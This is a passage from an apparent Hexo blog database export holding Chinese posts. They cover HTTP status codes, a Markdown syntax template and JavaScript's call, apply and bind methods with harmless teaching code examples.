src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/500.jpg\" alt=\"500\"></p>\n<p>表示服务器在执行请求时发生了错误，也可能是 Web 应用存在 bug 或某些临时故障</p>\n<h4 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/502.jpg\" alt=\"503\"></p>\n<p>表示服务器这暂时处于超负载或则会正在停机维修中，现在无法处理请求</p>\n<h4 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h4><p><a href=\"https://book.douban.com/subject/25863515/\">图解 HTTP</a></p>\n"},{"title":"Markdown 模板","date":"2019-05-18T16:24:25.000Z","_content":"\n\n### 常用语法\n\n#### 标题\n\n> 语法格式：** '#'+'空格'+'文本' **\n\n# 一级标题\n\n## 二级标题\n\n### 三级标题\n\n#### 四级标题\n\n##### 五级标题\n\n###### 六级标题\n\n#### 列表\n\n> 无序列表语法格式：** '-' + '空格' ＋ '文本' **\n\n- 文本一\n- 文本二\n- 文本三\n\n> 有序列表语法格式：** '数字' + '.' + '空格' + '文本' **\n\n1. 文本一\n2. 文本二\n3. 文本三\n\n> 任务列表语法格式：** '-' + '空格' + '[ ]' + '文本' **\n\n- [x] 文本一\n- [ ] 文本二\n- [ ] 文本三\n\n#### 链接和图片\n\n在 Markdown 中插入链接不需要其他按钮，你只需要使用`［显示文本］(链接地址)`这样的格式语法即可。例如：\n[稀土掘金](https://gold.xitu.io)\n插入图片的语法与插入链接的语法很像，只是前面多了一个 `!`.语法如下：\n`![图片的标注](图片链接地址)`\n\n#### 引用\n\n> 语法：** '>'+'空格'+'文本' **\n\n例如：\n\n> Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的 HTML 页面。\n\n#### 代码\n\n如下是代码段的语法：\n\n<pre>\n```编程语言\n 这是代码段\n```\n</pre>\n\n例如：\n\n```python\ndef bubbleSort(alist):\n for passnum in range(len(alist)-1,0,-1):\n #print alist,passnum\n for i in range(passnum):\n if alist[i]>alist[i+1]:\n temp = alist[i]\n alist[i] = alist[i+1]\n alist[i+1] = temp\n return alist\n```\n\n#### 表格\n\n**Markdown 　 Extra**　表格语法：\n\n| 项目   | 价格   |\n| ------ | ------ |\n| iPhone | \\$560  |\n| iPad   | \\$780  |\n| iMac   | \\$1000 |\n\n可以使用冒号来定义对齐方式：\n\n| 项目   |     价格 | 数量 |\n| :----- | -------: | :--: |\n| iPhone |  6000 元 |  5   |\n| iPad   |  3800 元 |  12  |\n| iMac   | 10000 元 | 234  |\n\n#### 结语\n\n以上是最常见的 Markdown 的语法和格式，如果你还希望深入的学习 Markdown，可以参考这里[Markdown 语法](https://www.appinn.com/markdown/)，非常感谢使用** 掘金－Markdown 编辑器**,希望为您提供舒适的写作体验。\n","source":"_posts/Markdown-template.md","raw":"---\ntitle: Markdown 模板\ndate: 2019-05-19 00:24:25\ntags:\n  - Markdown\n  - 教程\n---\n\n\n### 常用语法\n\n#### 标题\n\n> 语法格式：** '#'+'空格'+'文本' **\n\n# 一级标题\n\n## 二级标题\n\n### 三级标题\n\n#### 四级标题\n\n##### 五级标题\n\n###### 六级标题\n\n#### 列表\n\n> 无序列表语法格式：** '-' + '空格' ＋ '文本' **\n\n- 文本一\n- 文本二\n- 文本三\n\n> 有序列表语法格式：** '数字' + '.' + '空格' + '文本' **\n\n1. 文本一\n2. 文本二\n3. 文本三\n\n> 任务列表语法格式：** '-' + '空格' + '[ ]' + '文本' **\n\n- [x] 文本一\n- [ ] 文本二\n- [ ] 文本三\n\n#### 链接和图片\n\n在 Markdown 中插入链接不需要其他按钮，你只需要使用`［显示文本］(链接地址)`这样的格式语法即可。例如：\n[稀土掘金](https://gold.xitu.io)\n插入图片的语法与插入链接的语法很像，只是前面多了一个 `!`.语法如下：\n`![图片的标注](图片链接地址)`\n\n#### 引用\n\n> 语法：** '>'+'空格'+'文本' **\n\n例如：\n\n> Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的 HTML 页面。\n\n#### 代码\n\n如下是代码段的语法：\n\n<pre>\n```编程语言\n 这是代码段\n```\n</pre>\n\n例如：\n\n```python\ndef bubbleSort(alist):\n for passnum in range(len(alist)-1,0,-1):\n #print alist,passnum\n for i in range(passnum):\n if alist[i]>alist[i+1]:\n temp = alist[i]\n alist[i] = alist[i+1]\n alist[i+1] = temp\n return alist\n```\n\n#### 表格\n\n**Markdown 　 Extra**　表格语法：\n\n| 项目   | 价格   |\n| ------ | ------ |\n| iPhone | \\$560  |\n| iPad   | \\$780  |\n| iMac   | \\$1000 |\n\n可以使用冒号来定义对齐方式：\n\n| 项目   |     价格 | 数量 |\n| :----- | -------: | :--: |\n| iPhone |  6000 元 |  5   |\n| iPad   |  3800 元 |  12  |\n| iMac   | 10000 元 | 234  |\n\n#### 结语\n\n以上是最常见的 Markdown 的语法和格式，如果你还希望深入的学习 Markdown，可以参考这里[Markdown 语法](https://www.appinn.com/markdown/)，非常感谢使用** 掘金－Markdown 编辑器**,希望为您提供舒适的写作体验。\n","slug":"Markdown-template","published":1,"updated":"2022-02-23T07:24:15.054Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cu0007n0w1ao168pm7","content":"<h3 id=\"常用语法\"><a href=\"#常用语法\" class=\"headerlink\" title=\"常用语法\"></a>常用语法</h3><h4 id=\"标题\"><a href=\"#标题\" class=\"headerlink\" title=\"标题\"></a>标题</h4><blockquote>\n<p>语法格式：** ‘#’+’空格’+’文本’ **</p>\n</blockquote>\n<h1 id=\"一级标题\"><a href=\"#一级标题\" class=\"headerlink\" title=\"一级标题\"></a>一级标题</h1><h2 id=\"二级标题\"><a href=\"#二级标题\" class=\"headerlink\" title=\"二级标题\"></a>二级标题</h2><h3 id=\"三级标题\"><a href=\"#三级标题\" class=\"headerlink\" title=\"三级标题\"></a>三级标题</h3><h4 id=\"四级标题\"><a href=\"#四级标题\" class=\"headerlink\" title=\"四级标题\"></a>四级标题</h4><h5 id=\"五级标题\"><a href=\"#五级标题\" class=\"headerlink\" title=\"五级标题\"></a>五级标题</h5><h6 id=\"六级标题\"><a href=\"#六级标题\" class=\"headerlink\" title=\"六级标题\"></a>六级标题</h6><h4 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h4><blockquote>\n<p>无序列表语法格式：** ‘-‘ + ‘空格’ ＋ ‘文本’ **</p>\n</blockquote>\n<ul>\n<li>文本一</li>\n<li>文本二</li>\n<li>文本三</li>\n</ul>\n<blockquote>\n<p>有序列表语法格式：** ‘数字’ + ‘.’ + ‘空格’ + ‘文本’ **</p>\n</blockquote>\n<ol>\n<li>文本一</li>\n<li>文本二</li>\n<li>文本三</li>\n</ol>\n<blockquote>\n<p>任务列表语法格式：** ‘-‘ + ‘空格’ + ‘[ ]’ + ‘文本’ **</p>\n</blockquote>\n<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> 文本一</li>\n<li><input disabled=\"\" type=\"checkbox\"> 文本二</li>\n<li><input disabled=\"\" type=\"checkbox\"> 文本三</li>\n</ul>\n<h4 id=\"链接和图片\"><a href=\"#链接和图片\" class=\"headerlink\" title=\"链接和图片\"></a>链接和图片</h4><p>在 Markdown 中插入链接不需要其他按钮，你只需要使用<code>［显示文本］(链接地址)</code>这样的格式语法即可。例如：<br><a href=\"https://gold.xitu.io/\">稀土掘金</a><br>插入图片的语法与插入链接的语法很像，只是前面多了一个 <code>!</code>.语法如下：<br><code>![图片的标注](图片链接地址)</code></p>\n<h4 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h4><blockquote>\n<p>语法：** ‘&gt;’+’空格’+’文本’ **</p>\n</blockquote>\n<p>例如：</p>\n<blockquote>\n<p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的 HTML 页面。</p>\n</blockquote>\n<h4 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h4><p>如下是代码段的语法：</p>\n<pre>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这是代码段</span><br></pre></td></tr></table></figure>\n</pre>\n\n<p>例如：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bubbleSort</span>(<span class=\"params\">alist</span>):</span><br><span class=\"line\"> <span class=\"keyword\">for</span> passnum <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(alist)-<span class=\"number\">1</span>,<span class=\"number\">0</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\"> <span class=\"comment\">#print alist,passnum</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(passnum):</span><br><span class=\"line\"> <span class=\"keyword\">if</span> alist[i]&gt;alist[i+<span class=\"number\">1</span>]:</span><br><span class=\"line\"> temp = alist[i]</span><br><span class=\"line\"> alist[i] = alist[i+<span class=\"number\">1</span>]</span><br><span class=\"line\"> alist[i+<span class=\"number\">1</span>] = temp</span><br><span class=\"line\"> <span class=\"keyword\">return</span> alist</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h4><p><strong>Markdown 　 Extra</strong>　表格语法：</p>\n<table>\n<thead>\n<tr>\n<th>项目</th>\n<th>价格</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>iPhone</td>\n<td>$560</td>\n</tr>\n<tr>\n<td>iPad</td>\n<td>$780</td>\n</tr>\n<tr>\n<td>iMac</td>\n<td>$1000</td>\n</tr>\n</tbody></table>\n<p>可以使用冒号来定义对齐方式：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">项目</th>\n<th align=\"right\">价格</th>\n<th align=\"center\">数量</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">iPhone</td>\n<td align=\"right\">6000 元</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td align=\"left\">iPad</td>\n<td align=\"right\">3800 元</td>\n<td align=\"center\">12</td>\n</tr>\n<tr>\n<td align=\"left\">iMac</td>\n<td align=\"right\">10000 元</td>\n<td align=\"center\">234</td>\n</tr>\n</tbody></table>\n<h4 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h4><p>以上是最常见的 Markdown 的语法和格式，如果你还希望深入的学习 Markdown，可以参考这里<a href=\"https://www.appinn.com/markdown/\">Markdown 语法</a>，非常感谢使用** 掘金－Markdown 编辑器**,希望为您提供舒适的写作体验。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"常用语法\"><a href=\"#常用语法\" class=\"headerlink\" title=\"常用语法\"></a>常用语法</h3><h4 id=\"标题\"><a href=\"#标题\" class=\"headerlink\" title=\"标题\"></a>标题</h4><blockquote>\n<p>语法格式：** ‘#’+’空格’+’文本’ **</p>\n</blockquote>\n<h1 id=\"一级标题\"><a href=\"#一级标题\" class=\"headerlink\" title=\"一级标题\"></a>一级标题</h1><h2 id=\"二级标题\"><a href=\"#二级标题\" class=\"headerlink\" title=\"二级标题\"></a>二级标题</h2><h3 id=\"三级标题\"><a href=\"#三级标题\" class=\"headerlink\" title=\"三级标题\"></a>三级标题</h3><h4 id=\"四级标题\"><a href=\"#四级标题\" class=\"headerlink\" title=\"四级标题\"></a>四级标题</h4><h5 id=\"五级标题\"><a href=\"#五级标题\" class=\"headerlink\" title=\"五级标题\"></a>五级标题</h5><h6 id=\"六级标题\"><a href=\"#六级标题\" class=\"headerlink\" title=\"六级标题\"></a>六级标题</h6><h4 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h4><blockquote>\n<p>无序列表语法格式：** ‘-‘ + ‘空格’ ＋ ‘文本’ **</p>\n</blockquote>\n<ul>\n<li>文本一</li>\n<li>文本二</li>\n<li>文本三</li>\n</ul>\n<blockquote>\n<p>有序列表语法格式：** ‘数字’ + ‘.’ + ‘空格’ + ‘文本’ **</p>\n</blockquote>\n<ol>\n<li>文本一</li>\n<li>文本二</li>\n<li>文本三</li>\n</ol>\n<blockquote>\n<p>任务列表语法格式：** ‘-‘ + ‘空格’ + ‘[ ]’ + ‘文本’ **</p>\n</blockquote>\n<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> 文本一</li>\n<li><input disabled=\"\" type=\"checkbox\"> 文本二</li>\n<li><input disabled=\"\" type=\"checkbox\"> 文本三</li>\n</ul>\n<h4 id=\"链接和图片\"><a href=\"#链接和图片\" class=\"headerlink\" title=\"链接和图片\"></a>链接和图片</h4><p>在 Markdown 中插入链接不需要其他按钮，你只需要使用<code>［显示文本］(链接地址)</code>这样的格式语法即可。例如：<br><a href=\"https://gold.xitu.io/\">稀土掘金</a><br>插入图片的语法与插入链接的语法很像，只是前面多了一个 <code>!</code>.语法如下：<br><code>![图片的标注](图片链接地址)</code></p>\n<h4 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h4><blockquote>\n<p>语法：** ‘&gt;’+’空格’+’文本’ **</p>\n</blockquote>\n<p>例如：</p>\n<blockquote>\n<p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的 HTML 页面。</p>\n</blockquote>\n<h4 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h4><p>如下是代码段的语法：</p>\n<pre>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这是代码段</span><br></pre></td></tr></table></figure>\n</pre>\n\n<p>例如：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bubbleSort</span>(<span class=\"params\">alist</span>):</span><br><span class=\"line\"> <span class=\"keyword\">for</span> passnum <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(alist)-<span class=\"number\">1</span>,<span class=\"number\">0</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\"> <span class=\"comment\">#print alist,passnum</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(passnum):</span><br><span class=\"line\"> <span class=\"keyword\">if</span> alist[i]&gt;alist[i+<span class=\"number\">1</span>]:</span><br><span class=\"line\"> temp = alist[i]</span><br><span class=\"line\"> alist[i] = alist[i+<span class=\"number\">1</span>]</span><br><span class=\"line\"> alist[i+<span class=\"number\">1</span>] = temp</span><br><span class=\"line\"> <span class=\"keyword\">return</span> alist</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"表格\"><a href=\"#表格\" class=\"headerlink\" title=\"表格\"></a>表格</h4><p><strong>Markdown 　 Extra</strong>　表格语法：</p>\n<table>\n<thead>\n<tr>\n<th>项目</th>\n<th>价格</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>iPhone</td>\n<td>$560</td>\n</tr>\n<tr>\n<td>iPad</td>\n<td>$780</td>\n</tr>\n<tr>\n<td>iMac</td>\n<td>$1000</td>\n</tr>\n</tbody></table>\n<p>可以使用冒号来定义对齐方式：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">项目</th>\n<th align=\"right\">价格</th>\n<th align=\"center\">数量</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">iPhone</td>\n<td align=\"right\">6000 元</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td align=\"left\">iPad</td>\n<td align=\"right\">3800 元</td>\n<td align=\"center\">12</td>\n</tr>\n<tr>\n<td align=\"left\">iMac</td>\n<td align=\"right\">10000 元</td>\n<td align=\"center\">234</td>\n</tr>\n</tbody></table>\n<h4 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h4><p>以上是最常见的 Markdown 的语法和格式，如果你还希望深入的学习 Markdown，可以参考这里<a href=\"https://www.appinn.com/markdown/\">Markdown 语法</a>，非常感谢使用** 掘金－Markdown 编辑器**,希望为您提供舒适的写作体验。</p>\n"},{"title":"call&apply&bind","date":"2019-04-03T03:22:31.000Z","_content":"\n# call、apply、bind\n\n## 什么时候是用什么方法\n\n- apply：传递参数不多，传递类数组\n- call：确定参数个数，关注参数的对应关系\n- bind：不立即执行，生成一个新的函数，长期绑定某个函数给某个对象使用\n\n## call、apply、bind 三者均来自 Function.prototype，被设计用于改变函数内 this 的指向\n\n### **call** call() 方法调用一个函数, 其具有一个指定的 this 值和分别地提供的参数(参数的列表）\n\n**func.call(thisArg, arg1, arg2, ...)**\n\n#### 妙用\n\n- 调用匿名函数\n\n```\n(function() {\n    ...\n    this.__wrapped__=n;\n    ...\n}).call(this);\n\n// 兼容严格模式，严格模式下，匿名函数里this会报错。\n// 实现了匿名函数针对不同的this，做不同的处理。\n```\n\n- 字符串分割连接\n  **str.split('').join(',')**\n  **Array.prototype.join.call(str,',')**\n\n```\nvar str = 'hellow!';\nconsole.log(str.split('')); // [ 'h', 'e', 'l', 'l', 'o', 'w', '!' ]\nconsole.log(str.split('').join(',')); // h,e,l,l,o,w,!\nconsole.log(str); //hellow!\n\nvar temp = Array.prototype.join.call(str, ',');\n// var temp = Array.prototype.join.apply(str, [',']);\n// var temp = [].join.call(str, ',');\n// var temp = [].join.apply(str, [',']);\nconsole.log(temp); // h,e,l,l,o,w,!\nconsole.log(str); //hellow!\n\n```\n\n- 字符串取每一项\n\n```\nArray.prototype.map\n  .call('foo', item => {\n    console.log(item);\n    // f\n    // o\n    // o\n  })\n  .join('');\n\n// 字符串没有join方法,借用Array\n```\n\n### **apply** apply() 方法调用一个具有给定 this 值的函数，以及作为一个数组（或类似数组对象）提供的参数\n\n**func.apply(thisArg, [argsArray])**\n\n- thisArg 可选的参数。在 func 函数运行时使用的 this 值。注意，不一定是该函数执行时真正的 this 值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是 window 对象），当值为原始值（1，‘string’，true）时 this 会指向该原始值的自动包装对象（Number，String，Boole）。\n- argsArray 可选的参数。一个数组或者类数组对象（NodeList），其中的数组元素的每一项将作为单独的参数传给 func 函数。如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。从 ECMAScript 5 开始可以使用类数组对象。\n\n#### 妙用\n\n- 数组拼接\n\n```\nvar arry = ['a', 'b'];\nvar elements = [0, 1, 2];\n\n// 拼接数组 concat不会改变原数组\nvar con = arry.concat(elements);\nconsole.log(con); // [ 'a', 'b', 0, 1, 2 ]\nconsole.log(arry); // [ 'a', 'b' ]\n\n// 如果想改变原数组 可以用apply\narry.push.apply(arry, elements); // [\"a\", \"b\", 0, 1, 2]\n// 也可以用空数组\n// [].push.apply(arry, elements); // [\"a\", \"b\", 0, 1, 2]\nconsole.info(arry); // [\"a\", \"b\", 0, 1, 2]\n\n// 解决了想修改原数组，不想用循环，还想传递一个数组的问题\n```\n\n- 数组求最大值、最小值\n\n```\n\n// 找出数组最大值\nvar numbers = [1,3,2,5,9]\nvar max = Math.max.apply(null,numbers)\nconsole.log(max) // 9\n\nvar min = Math.min.apply(null,numbers)\nconsole.log(min) // 1\n\n// Math.max/Math.min 接收的参数为一组数值，不接受数组 Math.max(value1[,value2, ...])\n// apply的作用就是将 数组展开为一组数值\n// 还可以用...展开运算符来解决求最值的问题\n\nconsole.log(Math.max([1, 2, 3, 7, 4])); // NaN\nconsole.log(Math.max.apply(null, [1, 2, 3, 7, 4])); // 7\nconsole.log(Math.max(...[1, 2, 3, 7, 4])); // 7\n\n```\n\n- 伪数组转换\n  **Array.prototype.slice.apply**\n  **Array.prototype.slice.call**\n\n```\nvar arraylike = {\n  0: 'zhangsan',\n  1: 'lisi',\n  2: 'wanger',\n  3: 'zhaowu',\n  length: 4\n};\n\nvar arr = Array.prototype.slice.apply(arraylike);\nvar arr1 = Array.prototype.slice.call(arraylike);\n\nconsole.log(arr); // [ 'zhangsan', 'lisi', 'wanger', 'zhaowu' ]\nconsole.log(arr1); // [ 'zhangsan', 'lisi', 'wanger', 'zhaowu' ]\n\n```\n\n- 变量类型判断\n  **Object.prototype.toString.call**\n  **Object.prototype.toString.apply**\n\n```\nfunction isArray(obj) {\n  return Object.prototype.toString.call(obj) == '[object Array]';\n}\nconsole.log(isArray([])); // true\nconsole.log(isArray('qianduan')); //false\n\n// toString()方法允许被修改，以上假定未被修改\n// toString()为Object的原型方法，而Array，function等类型作为Object的实例，都重写了toString方法。\n// 不同的对象类型调用toString方法时，调用的是对应的重写之后的toString方法（function类型返回内容为函数体的字符串，Array类型返回元素组成的字符串），\n// 而不会去调用Object上原型toString方法（返回对象的具体类型），所以采用obj.toString()不能得到其对象类型，只能将obj转化为字符串类型；\n// 因此，在想要得到对象的具体类型时，应该调用Object上原型toString方法。\n\nfunction isArray1(obj) {\n  return Object.prototype.toString.apply(obj) == '[object Array]';\n}\nconsole.log(isArray1([])); // true\nconsole.log(isArray1('qianduan')); //false\n```\n\n- 构造继承\n\n```\nfunction Animal(name, age) {\n  this.name = name;\n  this.age = age;\n  //   console.log(this); // 指向全局\n}\n\nfunction Dog() {\n  // 继承自Animal\n  // 方法是 将Animal函数在Dog中调用一下，但是Animal中this的指向全局\n  //   Animal();\n  //   console.log(this); // Dog {}\n\n  //   需要调用apply，改变this指向Dog,这样Dog就继承了Animal的name和age\n  Animal.apply(this, ['cat', '5']);\n  // Animal.call(this, 'cat', '5');\n\n  //   console.log(this); // Dog { name: 'cat', age: '5' }\n  this.say = function() {\n    console.log(this.name + ':' + this.age);\n  };\n}\n\nvar dog = new Dog();\ndog.say(); //cat:5\n```\n\n### **bind** bind()方法创建一个新的函数，在调用时设置 this 关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\n\n**function.bind(thisArg[, arg1[, arg2[, ...]]])**\n\n- thisArg 调用绑定函数时作为 this 参数传递给目标函数的值。 如果使用 new 运算符构造绑定函数，则忽略该值。当使用 bind 在 setTimeout 中创建一个函数（作为回调提供）时，作为 thisArg 传递的任何原始值都将转换为 object。如果 bind 函数的参数列表为空，执行作用域的 this 将被视为新函数的 thisArg。\n- argsArray 当目标函数被调用时，预先添加到绑定函数的参数列表中的参数。\n- ES6 新增的方法，这个方法会返回一个新的函数（函数调用的方式），调用新的函数，会将原始函数的方法当做传入对象的方法使用，传入新函数的任何参数也会一并传入原始函数。\n\n```\nfunction f(x) {\n  this.a = 1;\n  this.b = function() {\n    return this.a + x;\n  };\n}\nvar obj = {\n  a: 10\n};\nvar newObj = new (f.bind(obj, 2))(); //传入了一个实参2\nconsole.log(newObj.a); [注释]: <> 输出 1, 说明返回的函数用作构造函数时obj(this的值)被忽略了\n\nconsole.log(newObj.b()); [注释]: <> 输出3 ，说明传入的实参2传入了原函数original\n```\n","source":"_posts/call&apply&bind过招.md","raw":"---\ntitle: call&apply&bind\ndate: 2019-04-03 11:22:31\ntags:\n  - 笔记\n  - JavaScript\n---\n\n# call、apply、bind\n\n## 什么时候是用什么方法\n\n- apply：传递参数不多，传递类数组\n- call：确定参数个数，关注参数的对应关系\n- bind：不立即执行，生成一个新的函数，长期绑定某个函数给某个对象使用\n\n## call、apply、bind 三者均来自 Function.prototype，被设计用于改变函数内 this 的指向\n\n### **call** call() 方法调用一个函数, 其具有一个指定的 this 值和分别地提供的参数(参数的列表）\n\n**func.call(thisArg, arg1, arg2, ...)**\n\n#### 妙用\n\n- 调用匿名函数\n\n```\n(function() {\n    ...\n    this.__wrapped__=n;\n    ...\n}).call(this);\n\n// 兼容严格模式，严格模式下，匿名函数里this会报错。\n// 实现了匿名函数针对不同的this，做不同的处理。\n```\n\n- 字符串分割连接\n  **str.split('').join(',')**\n  **Array.prototype.join.call(str,',')**\n\n```\nvar str = 'hellow!';\nconsole.log(str.split('')); // [ 'h', 'e', 'l', 'l', 'o', 'w', '!' ]\nconsole.log(str.split('').join(',')); // h,e,l,l,o,w,!\nconsole.log(str); //hellow!\n\nvar temp = Array.prototype.join.call(str, ',');\n// var temp = Array.prototype.join.apply(str, [',']);\n// var temp = [].join.call(str, ',');\n// var temp = [].join.apply(str, [',']);\nconsole.log(temp); // h,e,l,l,o,w,!\nconsole.log(str); //hellow!\n\n```\n\n- 字符串取每一项\n\n```\nArray.prototype.map\n  .call('foo', item => {\n    console.log(item);\n    // f\n    // o\n    // o\n  })\n  .join('');\n\n// 字符串没有join方法,借用Array\n```\n\n### **apply** apply() 方法调用一个具有给定 this 值的函数，以及作为一个数组（或类似数组对象）提供的参数\n\n**func.apply(thisArg, [argsArray])**\n\n- thisArg 可选的参数。在 func 函数运行时使用的 this 值。注意，不一定是该函数执行时真正的 this 值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是 window 对象），当值为原始值（1，‘string’，true）时 this 会指向该原始值的自动包装对象（Number，String，Boole）。\n- argsArray 可选的参数。一个数组或者类数组对象（NodeList），其中的数组元素的每一项将作为单独的参数传给 func 函数。如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。从 ECMAScript 5 开始可以使用类数组对象。\n\n#### 妙用\n\n- 数组拼接\n\n```\nvar arry = ['a', 'b'];\nvar elements = [0, 1, 2];\n\n// 拼接数组 concat不会改变原数组\nvar con = arry.concat(elements);\nconsole.log(con); // [ 'a', 'b', 0, 1, 2 ]\nconsole.log(arry); // [ 'a', 'b' ]\n\n// 如果想改变原数组 可以用apply\narry.push.apply(arry, elements); // [\"a\", \"b\", 0, 1, 2]\n// 也可以用空数组\n// [].push.apply(arry, elements); // [\"a\", \"b\", 0, 1, 2]\nconsole.info(arry); // [\"a\", \"b\", 0, 1, 2]\n\n// 解决了想修改原数组，不想用循环，还想传递一个数组的问题\n```\n\n- 数组求最大值、最小值\n\n```\n\n// 找出数组最大值\nvar numbers = [1,3,2,5,9]\nvar max = Math.max.apply(null,numbers)\nconsole.log(max) // 9\n\nvar min = Math.min.apply(null,numbers)\nconsole.log(min) // 1\n\n// Math.max/Math.min 接收的参数为一组数值，不接受数组 Math.max(value1[,value2, ...])\n// apply的作用就是将 数组展开为一组数值\n// 还可以用...展开运算符来解决求最值的问题\n\nconsole.log(Math.max([1, 2, 3, 7, 4])); // NaN\nconsole.log(Math.max.apply(null, [1, 2, 3, 7, 4])); // 7\nconsole.log(Math.max(...[1, 2, 3, 7, 4])); // 7\n\n```\n\n- 伪数组转换\n  **Array.prototype.slice.apply**\n  **Array.prototype.slice.call**\n\n```\nvar arraylike = {\n  0: 'zhangsan',\n  1: 'lisi',\n  2: 'wanger',\n  3: 'zhaowu',\n  length: 4\n};\n\nvar arr = Array.prototype.slice.apply(arraylike);\nvar arr1 = Array.prototype.slice.call(arraylike);\n\nconsole.log(arr); // [ 'zhangsan', 'lisi', 'wanger', 'zhaowu' ]\nconsole.log(arr1); // [ 'zhangsan', 'lisi', 'wanger', 'zhaowu' ]\n\n```\n\n- 变量类型判断\n  **Object.prototype.toString.call**\n  **Object.prototype.toString.apply**\n\n```\nfunction isArray(obj) {\n  return Object.prototype.toString.call(obj) == '[object Array]';\n}\nconsole.log(isArray([])); // true\nconsole.log(isArray('qianduan')); //false\n\n// toString()方法允许被修改，以上假定未被修改\n// toString()为Object的原型方法，而Array，function等类型作为Object的实例，都重写了toString方法。\n// 不同的对象类型调用toString方法时，调用的是对应的重写之后的toString方法（function类型返回内容为函数体的字符串，Array类型返回元素组成的字符串），\n// 而不会去调用Object上原型toString方法（返回对象的具体类型），所以采用obj.toString()不能得到其对象类型，只能将obj转化为字符串类型；\n// 因此，在想要得到对象的具体类型时，应该调用Object上原型toString方法。\n\nfunction isArray1(obj) {\n  return Object.prototype.toString.apply(obj) == '[object Array]';\n}\nconsole.log(isArray1([])); // true\nconsole.log(isArray1('qianduan')); //false\n```\n\n- 构造继承\n\n```\nfunction Animal(name, age) {\n  this.name = name;\n  this.age = age;\n  //   console.log(this); // 指向全局\n}\n\nfunction Dog() {\n  // 继承自Animal\n  // 方法是 将Animal函数在Dog中调用一下，但是Animal中this的指向全局\n  //   Animal();\n  //   console.log(this); // Dog {}\n\n  //   需要调用apply，改变this指向Dog,这样Dog就继承了Animal的name和age\n  Animal.apply(this, ['cat', '5']);\n  // Animal.call(this, 'cat', '5');\n\n  //   console.log(this); // Dog { name: 'cat', age: '5' }\n  this.say = function() {\n    console.log(this.name + ':' + this.age);\n  };\n}\n\nvar dog = new Dog();\ndog.say(); //cat:5\n```\n\n### **bind** bind()方法创建一个新的函数，在调用时设置 this 关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\n\n**function.bind(thisArg[, arg1[, arg2[, ...]]])**\n\n- thisArg 调用绑定函数时作为 this 参数传递给目标函数的值。 如果使用 new 